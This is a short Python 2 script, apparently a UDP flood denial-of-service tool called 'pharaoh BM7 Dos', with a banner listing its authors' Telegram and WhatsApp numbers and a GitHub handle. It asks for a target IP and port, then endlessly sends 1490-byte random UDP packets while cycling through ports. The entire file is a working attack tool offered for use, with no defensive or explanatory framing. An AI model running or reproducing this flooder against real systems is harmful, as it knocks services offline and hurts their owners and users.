import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet pharaoh BM7 Dos")
print ""
print "		by pharaoh BM7 & SUDIUM TA8"
print "		telegram : +1 510 216 7579"
print "		github   : pharaoh1bm7"
print "		whatsapp : +994 40 778 12 25"
print
ip = raw_input("	IP Target : ")
port = input("		Port      : ")

os.system("clear")
os.system("figlet Attack Starting")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s DOS to port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

